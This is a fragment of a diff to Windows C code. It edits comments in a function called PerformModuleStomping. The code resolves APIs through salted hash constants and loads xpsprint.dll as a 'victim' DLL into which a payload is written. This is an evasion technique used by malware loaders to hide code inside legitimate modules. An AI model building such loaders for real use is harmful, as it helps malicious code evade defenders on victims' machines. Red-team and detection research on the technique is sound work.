@@ -2,7 +2,7 @@
 #include <windows.h>
 #include "helpers.h"
 
-// Example hashes (Verify these with your hashing tool + salt 0x73DA31CB tomorrow!)
+// Example hashes
 #define HASH_KERNEL32          0x9C4928C0
 #define HASH_LOADLIBRARYW      0x8BC82B5C
 #define HASH_XPSPRINT          0x6757EB22
@@ -27,7 +27,7 @@ static BOOL PerformModuleStomping(LPVOID pPayload, SIZE_T sPayloadSize, LPVOID* 
     if (!pLoadLibraryW) return FALSE;
 
     // 2. Load the target "victim" DLL
-    // We check if it's already loaded first, otherwise we load it.
+    // Check if it's already loaded first, otherwise load it.
     HMODULE hVictimDll = HlpGetModuleHandle(HASH_XPSPRINT, 0x73DA31CB);
     if (!hVictimDll) {
         hVictimDll = pLoadLibraryW(L"xpsprint.dll");
